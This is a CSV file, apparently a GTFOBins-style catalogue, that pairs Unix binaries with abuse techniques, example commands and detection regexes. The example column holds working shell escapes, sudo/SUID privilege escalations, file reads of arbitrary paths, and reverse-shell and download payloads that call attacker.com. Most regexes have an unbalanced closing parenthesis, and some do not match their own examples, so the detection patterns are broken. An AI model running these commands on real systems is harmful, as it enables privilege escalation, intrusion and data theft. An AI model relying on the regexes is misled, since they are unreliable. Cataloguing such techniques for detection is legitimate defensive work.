Name,Function,ExampleCode,Regex
capsh,shell,capsh --,(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.*)
capsh,suid,./capsh --gid=0 --uid=0 --,(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.*)
capsh,sudo,sudo capsh --,(?i)(?:sudo\s+)?(?:\S*/)?capsh\s+.*)
cat,file-read,"cat ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cat\s+.*)
cat,suid,"./cat ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cat\s+.*)
cat,sudo,"sudo cat ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cat\s+.*)
cdist,shell,cdist shell -s /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+.*/bin/sh)
cdist,sudo,sudo cdist shell -s /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?cdist\s*\-s\s+.*/bin/sh)
certbot,shell,certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',(?i)(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s+.*/bin/sh)
certbot,sudo,sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0',(?i)(?:sudo\s+)?(?:\S*/)?certbot\s*\-n\s*\-d\s+.*/bin/sh)
check_by_ssh,shell,"check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?i)(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+.*/bin/sh)
check_by_ssh,sudo,"sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx",(?i)(?:sudo\s+)?(?:\S*/)?check_by_ssh\s*\-o\s*\-i\s*\-H\s*\-C\s+.*/bin/sh)
check_cups,file-read,check_cups --extra-opts=@$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_cups\s+.*)
check_cups,sudo,sudo check_cups --extra-opts=@$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_cups\s+.*)
check_log,file-read,"check_log -F $LFILE -O $OUTPUT
cat $OUTPUT",(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+.*)
check_log,file-write,check_log -F $INPUT -O $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+.*)
check_log,sudo,sudo check_log -F $INPUT -O $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_log\s*\-F\s*\-O\s+.*)
check_memory,file-read,check_memory --extra-opts=@$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_memory\s+.*)
check_memory,sudo,sudo check_memory --extra-opts=@$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_memory\s+.*)
check_raid,file-read,check_raid --extra-opts=@$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_raid\s+.*)
check_raid,sudo,sudo check_raid --extra-opts=@$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_raid\s+.*)
check_ssl_cert,command,"echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT",(?i)(?:sudo\s+)?(?:\S*/)?check_ssl_cert\s*\-H\s+.*)
check_ssl_cert,sudo,"echo ""$COMMAND | tee $OUTPUT"" > $TF
chmod +x $TF
umask 022
check_ssl_cert --curl-bin $TF -H example.net
cat $OUTPUT",(?i)(?:sudo\s+)?(?:\S*/)?check_ssl_cert\s*\-H\s+.*)
check_statusfile,file-read,check_statusfile $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_statusfile\s+.*)
check_statusfile,sudo,sudo check_statusfile $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?check_statusfile\s+.*)
chmod,suid,./chmod 6777 $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?chmod\s+.*)
chmod,sudo,sudo chmod 6777 $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?chmod\s+.*)
choom,shell,choom -n 0 /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?choom\s*\-n\s+.*/bin/sh)
choom,suid,./choom -n 0 -- /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?choom\s*\-n\s*\-p\s+.*/bin/sh)
choom,sudo,sudo choom -n 0 /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?choom\s*\-n\s+.*/bin/sh)
chown,suid,./chown $(id -un):$(id -gn) $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?chown\s+.*)
chown,sudo,sudo chown $(id -un):$(id -gn) $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?chown\s+.*)
chroot,suid,./chroot / /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?chroot\s*\-p\s+.*/bin/sh)
chroot,sudo,sudo chroot /,(?i)(?:sudo\s+)?(?:\S*/)?chroot\s+.*)
clamscan,file-read,"touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'",(?i)(?:sudo\s+)?(?:\S*/)?clamscan\s*\-d\s*\-f\s+.*)
clamscan,suid,"touch $TF/empty.yara
./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'",(?i)(?:sudo\s+)?(?:\S*/)?clamscan\s*\-d\s*\-f\s+.*)
clamscan,sudo,"touch $TF/empty.yara
sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'",(?i)(?:sudo\s+)?(?:\S*/)?clamscan\s*\-d\s*\-f\s+.*)
cmp,file-read,cmp $LFILE /dev/zero -b -l,(?i)(?:sudo\s+)?(?:\S*/)?cmp\s*\-b\s*\-l\s+.*)
cmp,suid,./cmp $LFILE /dev/zero -b -l,(?i)(?:sudo\s+)?(?:\S*/)?cmp\s*\-b\s*\-l\s+.*)
cmp,sudo,sudo cmp $LFILE /dev/zero -b -l,(?i)(?:sudo\s+)?(?:\S*/)?cmp\s*\-b\s*\-l\s+.*)
cobc,shell,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x",(?i)(?:sudo\s+)?(?:\S*/)?cobc\s+.*/bin/sh)
cobc,sudo,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x",(?i)(?:sudo\s+)?(?:\S*/)?cobc\s+.*/bin/sh)
column,file-read,column $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?column\s+.*)
column,suid,./column $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?column\s+.*)
column,sudo,sudo column $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?column\s+.*)
comm,file-read,comm $LFILE /dev/null 2>/dev/null,(?i)(?:sudo\s+)?(?:\S*/)?comm\s+.*)
comm,suid,comm $LFILE /dev/null 2>/dev/null,(?i)(?:sudo\s+)?(?:\S*/)?comm\s+.*)
comm,sudo,sudo comm $LFILE /dev/null 2>/dev/null,(?i)(?:sudo\s+)?(?:\S*/)?comm\s+.*)
composer,shell,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x",(?i)(?:sudo\s+)?(?:\S*/)?composer\s*\-i\s+.*/bin/sh)
composer,limited-suid,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
./composer --working-dir=$TF run-script x",(?i)(?:sudo\s+)?(?:\S*/)?composer\s*\-i\s+.*/bin/sh)
composer,sudo,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x",(?i)(?:sudo\s+)?(?:\S*/)?composer\s*\-i\s+.*/bin/sh)
cowsay,shell,"echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x",(?i)(?:sudo\s+)?(?:\S*/)?cowsay\s*\-f\s+.*/bin/sh)
cowsay,sudo,"echo 'exec ""/bin/sh"";' >$TF
sudo cowsay -f $TF x",(?i)(?:sudo\s+)?(?:\S*/)?cowsay\s*\-f\s+.*/bin/sh)
cowthink,shell,"echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x",(?i)(?:sudo\s+)?(?:\S*/)?cowthink\s*\-f\s+.*/bin/sh)
cowthink,sudo,"echo 'exec ""/bin/sh"";' >$TF
sudo cowthink -f $TF x",(?i)(?:sudo\s+)?(?:\S*/)?cowthink\s*\-f\s+.*/bin/sh)
cp,file-read,"cp ""$LFILE"" /dev/stdout",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,file-write,"echo ""DATA"" | cp /dev/stdin ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,suid,"echo ""DATA"" | ./cp /dev/stdin ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,suid,"echo ""DATA"" > $TF
./cp $TF $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,suid,"./cp --attributes-only --preserve=all ./cp ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,sudo,"echo ""DATA"" | sudo cp /dev/stdin ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,sudo,"echo ""DATA"" > $TF
sudo cp $TF $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*)
cp,sudo,"sudo cp /bin/sh /bin/cp
sudo cp",(?i)(?:sudo\s+)?(?:\S*/)?cp\s+.*/bin/sh)
cpan,shell,"cpan
! exec '/bin/bash'",(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+.*/bin/bash)
cpan,reverse-shell,"export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};","(?i)(?:sudo\s+)?(?:\S*/)?cpan\s*\-i\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
cpan,file-upload,"cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();",(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+.*)
cpan,file-download,"export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();",(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+.*)
cpan,sudo,"sudo cpan
! exec '/bin/bash'",(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+.*/bin/bash)
cpio,shell,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-o\s*\-F\s+.*/bin/sh)
cpio,file-read,"echo ""$LFILE"" | cpio -o",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-o\s+.*)
cpio,file-read,"echo ""$LFILE"" | cpio -dp $TF
cat ""$TF/$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s+.*)
cpio,file-write,"echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s+.*)
cpio,suid,"echo ""$LFILE"" | ./cpio -R $UID -dp $TF
cat ""$TF/$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s+.*)
cpio,suid,"echo DATA >$LFILE
echo $LFILE | ./cpio -R 0:0 -p $LDIR",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s*\-p\s+.*)
cpio,sudo,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-o\s*\-F\s+.*/bin/sh)
cpio,sudo,"echo ""$LFILE"" | sudo cpio -R $UID -dp $TF
cat ""$TF/$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s+.*)
cpio,sudo,"echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR",(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s*\-p\s+.*)
cpulimit,shell,cpulimit -l 100 -f /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?cpulimit\s*\-l\s*\-f\s+.*/bin/sh)
cpulimit,suid,./cpulimit -l 100 -f -- /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?cpulimit\s*\-l\s*\-f\s*\-p\s+.*/bin/sh)
cpulimit,sudo,sudo cpulimit -l 100 -f /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?cpulimit\s*\-l\s*\-f\s+.*/bin/sh)
crash,shell,"crash -h
!sh",(?i)(?:sudo\s+)?(?:\S*/)?crash\s*\-h\s+.*)
crash,command,"COMMAND='/usr/bin/id'
CRASHPAGER=""$COMMAND"" crash -h",(?i)(?:sudo\s+)?(?:\S*/)?crash\s*\-h\s+.*)
crash,sudo,"sudo crash -h
!sh",(?i)(?:sudo\s+)?(?:\S*/)?crash\s*\-h\s+.*)
crontab,command,crontab -e,(?i)(?:sudo\s+)?(?:\S*/)?crontab\s*\-e\s+.*)
crontab,sudo,sudo crontab -e,(?i)(?:sudo\s+)?(?:\S*/)?crontab\s*\-e\s+.*)
csh,shell,csh,(?i)(?:sudo\s+)?(?:\S*/)?csh\s+.*)
csh,file-write,"export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?csh\s*\-c\s+.*)
csh,suid,./csh -b,(?i)(?:sudo\s+)?(?:\S*/)?csh\s*\-b\s+.*)
csh,sudo,sudo csh,(?i)(?:sudo\s+)?(?:\S*/)?csh\s+.*)
csplit,file-read,"csplit $LFILE 1
cat xx01",(?i)(?:sudo\s+)?(?:\S*/)?csplit\s+.*)
csplit,file-write,"echo ""DATA"" > $TF
LFILE=file_to_write
csplit -z -b ""%d$LFILE"" $TF 1",(?i)(?:sudo\s+)?(?:\S*/)?csplit\s*\-z\s*\-b\s+.*)
csplit,suid,"csplit $LFILE 1
cat xx01",(?i)(?:sudo\s+)?(?:\S*/)?csplit\s+.*)
csplit,sudo,"csplit $LFILE 1
cat xx01",(?i)(?:sudo\s+)?(?:\S*/)?csplit\s+.*)
csvtool,file-read,csvtool trim t $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+.*)
csvtool,file-write,"echo DATA > $TF
csvtool trim t $TF -o $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s*\-o\s+.*)
csvtool,suid,./csvtool trim t $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+.*)
csvtool,shell,csvtool call '/bin/sh;false' /etc/passwd,(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+.*/bin/sh)
csvtool,sudo,sudo csvtool call '/bin/sh;false' /etc/passwd,(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+.*/bin/sh)
cupsfilter,file-read,cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?cupsfilter\s*\-i\s*\-m\s+.*)
cupsfilter,sudo,sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?cupsfilter\s*\-i\s*\-m\s+.*)
cupsfilter,suid,./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?cupsfilter\s*\-i\s*\-m\s+.*)
curl,file-upload,"curl -X POST -d ""@$LFILE"" $URL",(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-X\s*\-d\s+.*)
curl,file-download,curl $URL -o $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+.*)
curl,file-read,curl file://$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?curl\s+.*)
curl,file-write,"echo DATA >$TF
curl ""file://$TF"" -o ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+.*)
curl,suid,./curl $URL -o $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+.*)
curl,sudo,sudo curl $URL -o $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+.*)
cut,file-read,"cut -d """" -f1 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cut\s*\-d\s+.*)
cut,suid,"./cut -d """" -f1 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cut\s*\-d\s+.*)
cut,sudo,"sudo cut -d """" -f1 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?cut\s*\-d\s+.*)
dash,shell,dash,(?i)(?:sudo\s+)?(?:\S*/)?dash\s+.*)
dash,file-write,"export LFILE=file_to_write
dash -c 'echo DATA > $LFILE'",(?i)(?:sudo\s+)?(?:\S*/)?dash\s*\-c\s+.*)
dash,suid,./dash -p,(?i)(?:sudo\s+)?(?:\S*/)?dash\s*\-p\s+.*)
dash,sudo,sudo dash,(?i)(?:sudo\s+)?(?:\S*/)?dash\s+.*)
date,file-read,date -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?date\s*\-f\s+.*)
date,suid,./date -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?date\s*\-f\s+.*)
date,sudo,sudo date -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?date\s*\-f\s+.*)
dc,shell,dc -e '!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?dc\s*\-e\s+.*/bin/sh)
dc,sudo,sudo dc -e '!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?dc\s*\-e\s+.*/bin/sh)
dc,limited-suid,./dc -e '!/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?dc\s*\-e\s+.*/bin/sh)
dd,file-write,"echo ""DATA"" | dd of=$LFILE",(?i)(?:sudo\s+)?(?:\S*/)?dd\s+.*)
dd,file-read,dd if=$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?dd\s+.*)
dd,suid,"echo ""data"" | ./dd of=$LFILE",(?i)(?:sudo\s+)?(?:\S*/)?dd\s+.*)
dd,sudo,"echo ""data"" | sudo dd of=$LFILE",(?i)(?:sudo\s+)?(?:\S*/)?dd\s+.*)
debugfs,shell,"debugfs
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?debugfs\s+.*/bin/sh)
debugfs,suid,"./debugfs
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?debugfs\s+.*/bin/sh)
debugfs,sudo,"sudo debugfs
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?debugfs\s+.*/bin/sh)
dialog,file-read,"dialog --textbox ""$LFILE"" 0 0",(?i)(?:sudo\s+)?(?:\S*/)?dialog\s+.*)
dialog,suid,"./dialog --textbox ""$LFILE"" 0 0",(?i)(?:sudo\s+)?(?:\S*/)?dialog\s+.*)
dialog,sudo,"sudo dialog --textbox ""$LFILE"" 0 0",(?i)(?:sudo\s+)?(?:\S*/)?dialog\s+.*)
diff,file-read,diff --line-format=%L /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?diff\s+.*)
diff,file-read,diff --recursive $TF $LFOLDER,(?i)(?:sudo\s+)?(?:\S*/)?diff\s+.*)
diff,suid,./diff --line-format=%L /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?diff\s+.*)
diff,sudo,sudo diff --line-format=%L /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?diff\s+.*)
dig,file-read,dig -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?dig\s*\-f\s+.*)
dig,sudo,sudo dig -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?dig\s*\-f\s+.*)
dig,suid,./dig -f $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?dig\s*\-f\s+.*)
distcc,shell,distcc /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?distcc\s+.*/bin/sh)
distcc,suid,./distcc /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?distcc\s*\-p\s+.*/bin/sh)
distcc,sudo,sudo distcc /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?distcc\s+.*/bin/sh)
dmesg,file-read,"dmesg -rF ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?dmesg\s+.*)
dmesg,shell,"dmesg -H
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?dmesg\s*\-H\s+.*/bin/sh)
dmesg,sudo,"sudo dmesg -H
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?dmesg\s*\-H\s+.*/bin/sh)
dmidecode,sudo,"sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?dmidecode\s*\-d\s+.*)
dmsetup,sudo,"sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'",(?i)(?:sudo\s+)?(?:\S*/)?dmsetup\s*\-s\s+.*/bin/sh)
dmsetup,suid,"./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'",(?i)(?:sudo\s+)?(?:\S*/)?dmsetup\s*\-p\s*\-s\s+.*/bin/sh)
dnf,sudo,sudo dnf install -y x-1.0-1.noarch.rpm,(?i)(?:sudo\s+)?(?:\S*/)?dnf\s*\-y\s+.*)
docker,shell,docker run -v /:/mnt --rm -it alpine chroot /mnt sh,(?i)(?:sudo\s+)?(?:\S*/)?docker\s*\-v\s+.*)
docker,file-write,"echo ""DATA"" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write",(?i)(?:sudo\s+)?(?:\S*/)?docker\s+.*)
docker,file-read,"docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF",(?i)(?:sudo\s+)?(?:\S*/)?docker\s+.*)
docker,sudo,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh,(?i)(?:sudo\s+)?(?:\S*/)?docker\s*\-v\s+.*)
docker,suid,./docker run -v /:/mnt --rm -it alpine chroot /mnt sh,(?i)(?:sudo\s+)?(?:\S*/)?docker\s*\-v\s+.*)
dos2unix,file-write,"dos2unix -f -n ""$LFILE1"" ""$LFILE2""",(?i)(?:sudo\s+)?(?:\S*/)?dos2unix\s*\-f\s*\-n\s+.*)
dosbox,file-read,"dosbox -c 'mount c /' -c ""type c:$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s+.*)
dosbox,file-read,"dosbox -c 'mount c /' -c ""copy c:$LFILE c:\tmp\output"" -c exit
cat '/tmp/OUTPUT'",(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+.*)
dosbox,file-write,"dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit",(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+.*)
dosbox,suid,"./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit",(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+.*)
dosbox,sudo,"sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit",(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+.*)
dotnet,shell,"dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",(?i)(?:sudo\s+)?(?:\S*/)?dotnet\s+.*/bin/sh)
dotnet,file-read,"export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;",(?i)(?:sudo\s+)?(?:\S*/)?dotnet\s+.*)
dotnet,sudo,"sudo dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",(?i)(?:sudo\s+)?(?:\S*/)?dotnet\s+.*/bin/sh)
dpkg,shell,"dpkg -l
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?dpkg\s*\-l\s+.*/bin/sh)
dpkg,sudo,"sudo dpkg -l
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?dpkg\s*\-l\s+.*/bin/sh)
dpkg,sudo,sudo dpkg -i x_1.0_all.deb,(?i)(?:sudo\s+)?(?:\S*/)?dpkg\s*\-i\s+.*)
dstat,shell,"mkdir -p ~/.dstat
echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py
dstat --xxx",(?i)(?:sudo\s+)?(?:\S*/)?dstat\s*\-p\s+.*/bin/sh)
dstat,sudo,"echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py
sudo dstat --xxx",(?i)(?:sudo\s+)?(?:\S*/)?dstat\s+.*/bin/sh)
dvips,shell,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
dvips -R0 texput.dvi",(?i)(?:sudo\s+)?(?:\S*/)?dvips\s+.*/bin/sh)
dvips,sudo,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
sudo dvips -R0 texput.dvi",(?i)(?:sudo\s+)?(?:\S*/)?dvips\s+.*/bin/sh)
dvips,limited-suid,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
./dvips -R0 texput.dvi",(?i)(?:sudo\s+)?(?:\S*/)?dvips\s+.*/bin/sh)
easy_install,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF",(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s+.*/bin/sh)
easy_install,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
easy_install $TF","(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
